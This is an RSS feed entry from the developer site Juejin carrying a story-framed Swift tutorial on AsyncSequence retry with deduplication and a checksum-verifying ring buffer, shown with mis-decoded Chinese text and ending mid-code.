<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Swift è¿­ä»£ä¸‰å·¨å¤´ï¼ˆä¸‹é›†ï¼‰ï¼šSequenceã€Collection ä¸ Iterator æ·±åº¦ç‹‚é£™]]></title>    <link>https://juejin.cn/post/7581888578507751451</link>    <guid>https://juejin.cn/post/7581888578507751451</guid>    <pubDate>2025-12-10T02:12:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507751451" data-draft-id="7581702285564297266" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Swift è¿­ä»£ä¸‰å·¨å¤´ï¼ˆä¸‹é›†ï¼‰ï¼šSequenceã€Collection ä¸ Iterator æ·±åº¦ç‹‚é£™"/> <meta itemprop="keywords" content="Swift,Apple,ç¼–ç¨‹è¯­è¨€"/> <meta itemprop="datePublished" content="2025-12-10T02:12:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§ç†ŠçŒ«ä¾¯ä½©"/> <meta itemprop="url" content="https://juejin.cn/user/4292907536222152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Swift è¿­ä»£ä¸‰å·¨å¤´ï¼ˆä¸‹é›†ï¼‰ï¼šSequenceã€Collection ä¸ Iterator æ·±åº¦ç‹‚é£™
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292907536222152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§ç†ŠçŒ«ä¾¯ä½©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:12:24.000Z" title="Wed Dec 10 2025 02:12:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/577f8a07372742659bd5737aa4f02997~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=jM0rkEV7s4NH8z%2FvXiZOnHvx9Vc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-0">ğŸ›¡ï¸ ç¬¬ä¸€é‡é˜²çº¿ï¼šç ´è§£ AsyncSequence çš„é”™è¯¯æ¢å¤æ¼æ´</h2>
<p>å¼‚æ­¥åºåˆ—çš„ â€œé”™è¯¯æ¢å¤æ¼æ´â€ï¼Œæœ¬è´¨æ˜¯æ²¡ææ‡‚<code>AsyncSequence</code>çš„é”™è¯¯ä¼ æ’­è§„åˆ™ â€”â€” å°±åƒ F1 èµ›è½¦çš„åˆ¹è½¦ç³»ç»Ÿæ²¡æ ¡å‡†ï¼Œä¸€è¸©å°±æŠ±æ­»ï¼Œä¸€æ¾å°±å¤±æ§ã€‚</p>
<p>å½“<code>next()</code>æŠ›å‡ºé”™è¯¯æ—¶ï¼Œé»˜è®¤ä¼šç›´æ¥ç»ˆæ­¢è¿­ä»£ï¼Œå¯å¦‚æœç²—æš´é‡è¯•ï¼Œåˆä¼šå¯¼è‡´ â€œé‡å¤æ¥æ”¶å…ƒç´ â€ï¼›å¦‚æœä¸é‡è¯•ï¼Œåˆä¼šä¸¢å¤±å…³é”®æ•°æ®ã€‚</p>
<p><strong>åœ¨æœ¬å ‚F1è°ƒæ•™è¯¾ä¸­ï¼Œæ‚¨å°†å­¦åˆ°å¦‚ä¸‹å†…å®¹ï¼š</strong></p>
<ul>
<li>ğŸ›¡ï¸ ç¬¬ä¸€é‡é˜²çº¿ï¼šç ´è§£ AsyncSequence çš„é”™è¯¯æ¢å¤æ¼æ´</li>
<li>é”™è¯¯ä¼ æ’­çš„ â€œåº•å±‚é€»è¾‘â€</li>
<li>ç²¾å‡†é‡è¯•ï¼šç»™è¿­ä»£å™¨åŠ  â€œè®°å¿†åŠŸèƒ½â€</li>
<li>å®æˆ˜æ•ˆæœï¼šå†ä¹Ÿä¸é‡å¤ï¼Œå†ä¹Ÿä¸ä¸¢å¤±</li>
<li>ğŸ›¡ï¸ ç¬¬äºŒé‡é˜²çº¿ï¼šç»™ SafeRingBuffer åŠ  â€œæ•°æ®æ ¡éªŒé”â€</li>
<li>æ ¡éªŒé€»è¾‘ï¼šå“ˆå¸Œå€¼æ˜¯ â€œæ•°æ®èº«ä»½è¯â€</li>
<li>å‡çº§åçš„ SafeRingBufferï¼ˆæ ¸å¿ƒæ ¡éªŒä»£ç ï¼‰</li>
<li>æ•ˆæœï¼šâ€œè¿­ä»£å¼‚å¸¸å…½â€ çš„ç¯¡æ”¹å½»åº•å¤±æ•ˆ</li>
<li>ğŸ† ç»ˆå±€ï¼šç»„åˆæ‹³ç²‰ç¢ â€œè¿­ä»£å¼‚å¸¸å…½â€</li>
<li>å®Œæ•´æµç¨‹ä»£ç ï¼ˆç»ˆå±€æ–¹æ¡ˆï¼‰</li>
<li>å‰§æƒ…æ”¶å°¾ï¼šèµ›é“æ¢å¤å¹³é™ï¼Œè¿­ä»£çœŸç›¸æ­æ™“</li>
<li>ğŸ“ ç»ˆææ€»ç»“ï¼šSwift è¿­ä»£çš„ â€œé»„é‡‘æ³•åˆ™â€</li>
</ul>
<p>è‰¾æ‹‰å’Œæ°è¥¿è¦åšçš„ï¼Œå°±æ˜¯æ‰¾åˆ° â€œç²¾å‡†é‡è¯•â€ çš„å¹³è¡¡ç‚¹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b86b2f8effd34873ad9199535972bebe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=2LViD3R92VzlLvqpyiZg3ArWb3Y%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">é”™è¯¯ä¼ æ’­çš„ â€œåº•å±‚é€»è¾‘â€</h3>
<p>å…ˆææ‡‚ä¸€ä¸ªå…³é”®ï¼š<code>AsyncSequence</code>çš„é”™è¯¯æ˜¯ â€œç»ˆæ­¢æ€§çš„â€â€”â€” ä¸€æ—¦<code>next()</code>æŠ›å‡ºé”™è¯¯ï¼Œæ•´ä¸ªè¿­ä»£å°±ä¼šåœæ­¢ï¼Œå°±åƒèµ›è½¦å¼•æ“çˆ†ç¼¸åå†ä¹Ÿæ²¡æ³•å‰è¿›ã€‚æ¯”å¦‚ä¼ æ„Ÿå™¨æ–­è¿æŠ›å‡º<code>SensorDisconnectError</code>ï¼Œ<code>for try await</code>å¾ªç¯ä¼šç«‹åˆ»è·³å‡ºï¼Œè¿›å…¥<code>catch</code>å—ï¼Œåç»­çš„å…ƒç´ å†ä¹Ÿæ¥æ”¶ä¸åˆ°ã€‚</p>
<p>çœ‹è¿™ä¸ª â€œè¸©å‘ç¤ºä¾‹â€ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// é”™è¯¯ç¤ºèŒƒï¼šç²—æš´é‡è¯•å¯¼è‡´é‡å¤æ•°æ®</span>
<span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> <span class="hljs-type">SensorSequence</span>() {
            sensorBuffer.enqueue(data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¥æ”¶æ•°æ®ï¼š<span class="hljs-subst">\(data)</span>"</span>)
        }
    } <span class="hljs-keyword">catch</span> <span class="hljs-keyword">is</span> <span class="hljs-type">SensorDisconnectError</span> {
        <span class="hljs-comment">// æ–­è¿åç›´æ¥é‡è¯•ï¼Œå´æ²¡è®°å½•â€œå·²æ¥æ”¶çš„å…ƒç´ IDâ€</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä¼ æ„Ÿå™¨æ–­è¿ï¼Œé‡è¯•ä¸­..."</span>)
        <span class="hljs-keyword">await</span> retrySensorSequence() <span class="hljs-comment">// é‡è¯•æ—¶ä¼šé‡æ–°æ¥æ”¶ä¹‹å‰å·²å¤„ç†çš„å…ƒç´ </span>
    }
}
</code></pre>
<p>è¿™æ®µä»£ç çš„é—®é¢˜åœ¨äºï¼šé‡è¯•æ—¶ä¼šç”Ÿæˆ<strong>å…¨æ–°çš„å¼‚æ­¥è¿­ä»£å™¨</strong>ï¼Œå®ƒä¸çŸ¥é“ä¹‹å‰å·²ç»æ¥æ”¶è¿‡å“ªäº›å…ƒç´ ï¼Œå¯¼è‡´ â€œæ—§æ•°æ®é‡å¤å…¥é˜Ÿâ€â€”â€” è¿™æ­£æ˜¯ â€œè¿­ä»£å¼‚å¸¸å…½â€ æƒ³è¦çš„ç»“æœã€‚</p>
<h3 data-id="heading-2">ç²¾å‡†é‡è¯•ï¼šç»™è¿­ä»£å™¨åŠ  â€œè®°å¿†åŠŸèƒ½â€</h3>
<p>æ°è¥¿çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼šè‡ªå®šä¹‰ä¸€ä¸ª<code>RetryableSensorSequence</code>ï¼Œç»™å¼‚æ­¥è¿­ä»£å™¨åŠ  â€œå…ƒç´  ID è®°å¿†â€ï¼Œé‡è¯•æ—¶è·³è¿‡å·²å¤„ç†çš„å…ƒç´ ï¼Œå°±åƒèµ›è½¦åœ¨ç»´ä¿®åé‡å›èµ›é“ï¼Œèƒ½ç²¾å‡†æ¥ä¸Šä¹‹å‰çš„ä½ç½®ç»§ç»­è·‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3dc9140ed6545848f14851214cf4eb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=65BrhpIa8atU9GsAHYH4duaVhFM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å¸¦â€œè®°å¿†åŠŸèƒ½â€çš„å¯é‡è¯•å¼‚æ­¥åºåˆ—</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">RetryableSensorSequence</span>: <span class="hljs-title class_">AsyncSequence</span> {
    <span class="hljs-keyword">typealias</span> <span class="hljs-type">Element</span> <span class="hljs-operator">=</span> <span class="hljs-type">SensorData</span> <span class="hljs-comment">// ä¼ æ„Ÿå™¨æ•°æ®ï¼ˆå«å”¯ä¸€IDå’Œæ ¡éªŒç ï¼‰</span>
    <span class="hljs-keyword">typealias</span> <span class="hljs-type">AsyncIterator</span> <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorIterator</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> baseSequence: <span class="hljs-type">SensorSequence</span> <span class="hljs-comment">// åŸå§‹ä¼ æ„Ÿå™¨åºåˆ—</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> processedIDs: <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-operator">=</span> [] <span class="hljs-comment">// è®°å½•å·²å¤„ç†çš„å…ƒç´ IDï¼ˆé˜²é‡å¤ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxRetries: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span> <span class="hljs-comment">// æœ€å¤§é‡è¯•æ¬¡æ•°ï¼ˆé¿å…æ— é™å¾ªç¯ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentRetry: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-comment">// å½“å‰é‡è¯•æ¬¡æ•°</span>

    <span class="hljs-keyword">init</span>(<span class="hljs-params">baseSequence</span>: <span class="hljs-type">SensorSequence</span>) {
        <span class="hljs-keyword">self</span>.baseSequence <span class="hljs-operator">=</span> baseSequence
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeAsyncIterator</span>() -&gt; <span class="hljs-type">RetryableSensorIterator</span> {
        <span class="hljs-type">RetryableSensorIterator</span>(
            baseIterator: baseSequence.makeAsyncIterator(),
            processedIDs: <span class="hljs-operator">&amp;</span>processedIDs,
            maxRetries: maxRetries,
            currentRetry: <span class="hljs-operator">&amp;</span>currentRetry
        )
    }

    <span class="hljs-comment">// å¸¦è®°å¿†åŠŸèƒ½çš„å¼‚æ­¥è¿­ä»£å™¨</span>
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">RetryableSensorIterator</span>: <span class="hljs-title class_">AsyncIteratorProtocol</span> {
        <span class="hljs-keyword">typealias</span> <span class="hljs-type">Element</span> <span class="hljs-operator">=</span> <span class="hljs-type">SensorData</span>
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> baseIterator: <span class="hljs-type">SensorSequence</span>.<span class="hljs-type">AsyncIterator</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> processedIDs: <span class="hljs-keyword">inout</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">String</span>&gt; <span class="hljs-comment">// å¼•ç”¨å¤–éƒ¨çš„å·²å¤„ç†IDé›†åˆ</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> maxRetries: <span class="hljs-type">Int</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentRetry: <span class="hljs-keyword">inout</span> <span class="hljs-type">Int</span>

        <span class="hljs-keyword">mutating</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">next</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">SensorData</span>? {
            <span class="hljs-keyword">do</span> {
                <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> baseIterator.next() <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> <span class="hljs-comment">// åºåˆ—æ­£å¸¸ç»“æŸ</span>
                }
                <span class="hljs-comment">// å…³é”®ï¼šæ£€æŸ¥å…ƒç´ IDæ˜¯å¦å·²å¤„ç†ï¼Œé¿å…é‡å¤</span>
                <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>processedIDs.contains(data.id) <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> next() <span class="hljs-comment">// è·³è¿‡é‡å¤å…ƒç´ ï¼Œç»§ç»­è·å–ä¸‹ä¸€ä¸ª</span>
                }
                processedIDs.insert(data.id) <span class="hljs-comment">// è®°å½•å·²å¤„ç†çš„ID</span>
                <span class="hljs-keyword">return</span> data
            } <span class="hljs-keyword">catch</span> <span class="hljs-keyword">is</span> <span class="hljs-type">SensorDisconnectError</span> {
                <span class="hljs-comment">// è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°ï¼ŒæŠ›å‡ºæœ€ç»ˆé”™è¯¯</span>
                <span class="hljs-keyword">guard</span> currentRetry <span class="hljs-operator">&lt;</span> maxRetries <span class="hljs-keyword">else</span> {
                    currentRetry <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-comment">// é‡ç½®é‡è¯•æ¬¡æ•°ï¼Œæ–¹ä¾¿åç»­å¤ç”¨</span>
                    <span class="hljs-keyword">throw</span> error <span class="hljs-comment">// é‡è¯•å¤±è´¥ï¼Œç»ˆæ­¢è¿­ä»£</span>
                }
                currentRetry <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¬¬<span class="hljs-subst">\(currentRetry)</span>æ¬¡é‡è¯•ä¼ æ„Ÿå™¨è¿æ¥..."</span>)
                <span class="hljs-comment">// é‡å»ºåŸºç¡€è¿­ä»£å™¨ï¼ˆé‡æ–°è¿æ¥ä¼ æ„Ÿå™¨ï¼‰</span>
                <span class="hljs-keyword">self</span>.baseIterator <span class="hljs-operator">=</span> <span class="hljs-type">SensorSequence</span>().makeAsyncIterator()
                <span class="hljs-comment">// é€’å½’è°ƒç”¨next()ï¼Œç»§ç»­è¿­ä»£ï¼ˆä¸é‡å¤å·²å¤„ç†å…ƒç´ ï¼‰</span>
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> next()
            } <span class="hljs-keyword">catch</span> {
                <span class="hljs-comment">// å…¶ä»–é”™è¯¯ï¼ˆæ¯”å¦‚æ•°æ®æ ¼å¼é”™è¯¯ï¼‰ï¼Œç›´æ¥æŠ›å‡º</span>
                <span class="hljs-keyword">throw</span> error
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-3">å®æˆ˜æ•ˆæœï¼šå†ä¹Ÿä¸é‡å¤ï¼Œå†ä¹Ÿä¸ä¸¢å¤±</h3>
<p>è‰¾æ‹‰æŠŠè¿™ä¸ª â€œå¸¦è®°å¿†çš„åºåˆ—â€ é›†æˆåˆ°ç³»ç»Ÿåï¼Œæ•ˆæœç«‹ç«¿è§å½±ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// æ­£ç¡®å§¿åŠ¿ï¼šç”¨å¯é‡è¯•åºåˆ—æ¶ˆè´¹ä¼ æ„Ÿå™¨æ•°æ®</span>
<span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">let</span> retryableSequence <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorSequence</span>(baseSequence: <span class="hljs-type">SensorSequence</span>())
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> retryableSequence {
            sensorBuffer.enqueue(data)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"å®‰å…¨æ¥æ”¶æ•°æ®ï¼š<span class="hljs-subst">\(data)</span>ï¼ˆIDï¼š<span class="hljs-subst">\(data.id)</span>ï¼‰"</span>)
        }
    } <span class="hljs-keyword">catch</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"æœ€ç»ˆå¤±è´¥ï¼š<span class="hljs-subst">\(error)</span>ï¼Œå·²è§¦å‘å¤‡ç”¨ä¼ æ„Ÿå™¨"</span>)
    }
}
</code></pre>
<p>å½“ä¼ æ„Ÿå™¨æ–­è¿æ—¶ï¼Œåºåˆ—ä¼šè‡ªåŠ¨é‡è¯•ï¼ˆæœ€å¤š 3 æ¬¡ï¼‰ï¼Œä¸”é‡è¯•åç»ä¸ä¼šé‡å¤æ¥æ”¶æ—§æ•°æ® â€”â€” å› ä¸º<code>processedIDs</code>ä¼šç‰¢ç‰¢è®°ä½ â€œå“ªäº›æ•°æ®å·²ç»å¤„ç†è¿‡â€ã€‚å°±åƒèµ›è½¦åœ¨ç»´ä¿®åŒºå¿«é€Ÿæ¢èƒåï¼Œèƒ½ç²¾å‡†å›åˆ°èµ›é“çš„æ­£ç¡®ä½ç½®ï¼Œæ—¢ä¸è½åï¼Œä¹Ÿä¸è·‘åã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/832ed2ad1566491297ab477c29983d1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=1rZ4a90yK9%2Bz7N2hjzG%2FADLT8LE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-4">ğŸ›¡ï¸ ç¬¬äºŒé‡é˜²çº¿ï¼šç»™ SafeRingBuffer åŠ  â€œæ•°æ®æ ¡éªŒé”â€</h2>
<p>è§£å†³äº†é‡å¤é—®é¢˜ï¼Œä¸‹ä¸€ä¸ªç›®æ ‡æ˜¯ â€œæ•°æ®ç¯¡æ”¹â€â€”â€”â€œè¿­ä»£å¼‚å¸¸å…½â€ ä¼šä¿®æ”¹ä¼ æ„Ÿå™¨æ•°æ®çš„æ ¡éªŒç ï¼Œè®©é”™è¯¯æ•°æ®æ··å…¥ç¼“å†²åŒºã€‚æ°è¥¿çš„æ–¹æ¡ˆæ˜¯ï¼šç»™<code>SafeRingBuffer</code>å‡çº§ï¼Œåœ¨ â€œå…¥é˜Ÿâ€ å’Œ â€œè®¿é—®â€ æ—¶åŒé‡æ ¡éªŒæ•°æ®å®Œæ•´æ€§ï¼Œå°±åƒç»™èµ›è½¦è£… â€œæŒ‡çº¹é”â€ï¼Œä¸æ˜¯è‡ªå·±äººçš„æ•°æ®ï¼Œä¸€æ¦‚ä¸è®©è¿›ã€‚</p>
<h3 data-id="heading-5">æ ¡éªŒé€»è¾‘ï¼šå“ˆå¸Œå€¼æ˜¯ â€œæ•°æ®èº«ä»½è¯â€</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5cc302dcd644aebbf01a7376a295f3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=TbpPs%2FVomi9llBioH%2FeZaaiRBBM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä¼ æ„Ÿå™¨æ•°æ®ä¼šè‡ªå¸¦ä¸€ä¸ª<code>checksum</code>ï¼ˆå“ˆå¸Œå€¼ï¼‰ï¼Œè®¡ç®—è§„åˆ™æ˜¯ â€œæ•°æ®å†…å®¹ + æ—¶é—´æˆ³â€ çš„ MD5 å€¼ã€‚<code>SafeRingBuffer</code>åœ¨å…¥é˜Ÿæ—¶è¦éªŒè¯è¿™ä¸ªå“ˆå¸Œå€¼ï¼Œä¸åŒ¹é…å°±æ‹’ç»å…¥é˜Ÿï¼›åœ¨è®¿é—®æ—¶å†äºŒæ¬¡æ ¡éªŒï¼Œç¡®ä¿æ•°æ®æ²¡è¢«ç¯¡æ”¹ã€‚</p>
<h4 data-id="heading-6">å‡çº§åçš„ SafeRingBufferï¼ˆæ ¸å¿ƒæ ¡éªŒä»£ç ï¼‰</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SafeRingBuffer</span>&lt;<span class="hljs-title class_">Element</span>: <span class="hljs-title class_">DataVerifiable</span>&gt;: <span class="hljs-title class_">Collection</span> {
    <span class="hljs-comment">// æ–°å¢çº¦æŸï¼šElementå¿…é¡»éµå®ˆDataVerifiableåè®®ï¼ˆæœ‰æ ¡éªŒèƒ½åŠ›ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> storage: [<span class="hljs-type">Element</span>?]
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> head <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> tail <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
